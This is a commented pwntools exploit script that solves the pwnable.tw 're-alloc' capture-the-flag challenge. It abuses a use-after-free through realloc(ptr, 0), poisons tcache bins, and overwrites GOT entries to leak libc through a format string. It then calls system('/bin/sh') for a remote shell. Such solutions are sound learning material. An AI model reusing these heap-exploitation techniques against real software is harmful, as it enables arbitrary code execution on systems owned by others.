"""
REALLOC
----------------

The realloc() function changes the size of the memory block pointed to by ptr to size bytes.  The contents will be unchanged in the range from  the  start
of  the region up to the minimum of the old and new sizes.  If the new size is larger than the old size, the added memory will not be initialized.  If ptr
is NULL, then the call is equivalent to malloc(size), for all values of size; if size is equal to zero, and ptr is not NULL, then the call  is  equivalent
to free(ptr).  Unless ptr is NULL, it must have been returned by an earlier call to malloc(), calloc(), or realloc().  If the area pointed to was moved, a
free(ptr) is done.

RETURN VALUE
----------------

The realloc() function returns a pointer to the newly allocated memory, which is suitably aligned for any built-in type, or NULL if  the  request  failed.
The  returned  pointer  may be the same as ptr if the allocation was not moved (e.g., there was room to expand the allocation in-place), or different from
ptr if the allocation was moved to a new address.  If size was equal to 0, either NULL or a pointer suitable to be passed to free() is returned.  If real‚Äê
loc() fails, the original block is left untouched; it is not freed or moved.

re-alloc CTF

constraints:
1. 0 <= allocation size <= 120 (free'd chunks go into the tcache bins).
2. menu alloc() can be called only if heap[idx] is NULL.
3. menu realloc() can be called only if heap[idx] is NOT NULL.
"""

import argparse

from pwn import *
from enum import Enum


class Menu(Enum):
    Alloc = 1
    Realloc = 2
    Free = 3
    Exit = 4


class ReallocApp:
    def __init__(self, r: tube):
        self._r = r

    def select_menu(self, menu: Menu):
        self._r.sendlineafter(b"Your choice: ", str(menu.value).encode())

    def alloc(self, index: int, data: bytes, size: int):
        self.select_menu(Menu.Alloc)
        self._r.sendafter(b"Index:", str(index).encode())
        self._r.sendafter(b"Size:", str(size).encode())
        self._r.sendafter(b"Data:", data)

    def trigger_uaf(self, index: int):
        self.realloc(index, None, 0)

    def realloc(self, index: int, data: bytes, size: int):
        # There's a vuln in this menu action. Size is not checked against zero,
        # therefore it's possible to trigger realloc(heap[idx], 0) which is essentially free(heap[idx]),
        # leaving the free'd pointer in heap[idx].

        self.select_menu(Menu.Realloc)
        self._r.sendafter(b"Index:", str(index).encode())
        self._r.sendafter(b"Size:", str(size).encode())

        if size == 0:
            # check that we've triggered realloc(heap[index], 0)
            self._r.recvuntil(b"alloc error")
        else:
            # data will be written into heap[index]
            self._r.sendafter(b"Data:", data)

    def free(self, index: int):
        self.select_menu(Menu.Free)
        self._r.sendafter(b"Index:", str(index).encode())

    def exit(self):
        self.select_menu(Menu.Exit)


def conn(debug: bool):
    if debug:
        # for debug, use the patched re-alloc binary that uses the libc.so from the CTF
        return process("./re-alloc_patched")

    return remote("chall.pwnable.tw", 10106)


TcacheBins = {0x20: 0x10, 0x30: 0x20}


class Exploit:
    def __init__(self, r: tube):
        self._r = r
        self._app = ReallocApp(r)

        with context.quiet:
            self._libc = ELF("./libc.so.6")
            self._elf = ELF("./re-alloc")

    def _tcache_poision_bin(self, bin: int, addr: int):
        """
        Poision the tcache bins in order to controll next two malloc()s.
        heap[1] = realloc(NULL, 20)

        // same as free(heap[1]);
        realloc(heap[1], 0);

        // from now on, the chunk pointed by heap[1] is a freed chunk!

        // from realloc() man page:

        // If ptr does not match a pointer returned earlier by calloc(),
        // malloc(), or realloc() or if the space has previously been
        // deallocated by a call to free() or realloc(), the behavior is
        // undefined.

        // It seems like the chunk remains freed, but realloc() returns the very same pointer
        // that it returned on the first allocation, so we can overwrite the tcache foward pointer
        // which is the first 8 bytes of the deallocated data.
        heap[1] = realloc(heap[1], 20);
        read(heap[1], DATA_FROM_STDIN, 20);

        // Allocate heap[0] with size=20. It's gonna get the same chunk that was freed earlier (pointer that is in heap[1]).
        // That means, heap[0] = heap[1] at that point, and they both point to an ALLOCATED chunk.
        heap[0] = realloc(NULL, 20);

        // realloc(heap[1], 100) to pass double free check
        heap[1] = realloc(heap[1], 100);

        free(heap[1]);
        heap[1] = NULL;

        heap[0] = realloc(heap[0], 120);

        free(heap[0]);
        heap[0] = NULL;
        """

        alloc_size = TcacheBins[bin]

        pb = log.progress(f"Poisoning tcache bin for size <= {bin:#x}")
        self._app.alloc(1, b"AAAA", alloc_size)
        self._app.trigger_uaf(1)

        # overwrite the forward pointer of the tcache bin to p64(addr).
        self._app.realloc(1, p64(addr), alloc_size)  # UAF!!!
        self._app.alloc(0, b"BBBB", alloc_size)

        # from this point the tcache bin 0x20 is already poisioned with the `addr`.
        # we need to now make sure heap[0] and heap[1] are set to NULL because we need to call alloc()
        # to get the write-what-where primitive. we use different sizes for the realloc()
        # in order to avoid double-free detection by glibc runtime.

        # set heap[0] to NULL without messing with the >= 0x20 tcache bin
        self._app.realloc(0, b"AAAA", 50)
        self._app.free(0)

        # set heap[0] to NULL without messing with the >= 0x20 tcache bin
        self._app.realloc(1, b"BBBB", 70)
        self._app.free(1)

        pb.success(f"Next heap alloc for this bin will return {addr:#x}")

    def _tcache_poison(self, addr: int):
        self._tcache_poision_bin(0x20, addr)
        self._tcache_poision_bin(0x30, addr)

    def _set_libc_base(self, libc_base: int):
        if libc_base % 0x1000 != 0:
            raise RuntimeError("Failed to calculate libc base address")

        self._libc.address = libc_base

    def _leak_libc__IO_2_1_stdout_(self) -> int:
        # overwrite atoll got entry with printf@plt
        info("Performing GOT overwrite: atoll -> printf")

        # use the tcache bin of size <= 0x30 for the leak
        self._app.alloc(0, p64(self._elf.plt.printf), TcacheBins[0x30])
        self._app.select_menu(Menu.Free)

        info("Leaking stack data...")
        self._r.sendafter(b"Index:", b"%7$p")
        leak = self._r.recvuntil(b"Invalid !", drop=True)
        return int(leak, base=16)

    def exploit(self):
        self._tcache_poison(self._elf.got.atoll)

        leak = self._leak_libc__IO_2_1_stdout_()
        libc_base = leak - self._libc.sym["_IO_2_1_stdout_"]
        self._set_libc_base(libc_base)

        info(f"Leaked libc _IO_2_1_stdout_: {leak:#x}")
        info(f"Libc base: {libc_base:#x}")

        # use the second tcache bin to overwrite atoll entry to system
        # sending an empty string because the newline added to that will cause printf to return 1,
        # and this is what we need.

        system_addr = self._libc.sym["system"]
        info("Performing GOT overwrite: atoll -> system")

        # use the tcache bin of size <= 0x20 for the leak
        # write 8 bytes at the got entry for atoll(). we write 8 A's
        # because atoll() is currently overwritten to printf@plt, which returns the number of bytes written.
        self._app.alloc(1 * "A", p64(system_addr), 8 * b"A")

        # Select rfree() function in order to trigger atoll().
        self._app.select_menu(Menu.Free)

        # send /bin/sh as index, will be called as atoll(/bin/sh) == system(/bin/sh)
        self._r.sendafter(b"Index:", b"/bin/sh")
        self._r.interactive()


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--local", action="store_true")
    parser.add_argument("--debug", action="store_true")
    args = parser.parse_args()

    r = conn(args.local)

    if args.debug:
        gdb.attach(r)

    exploit = Exploit(r)
    exploit.exploit()


if __name__ == "__main__":
    main()
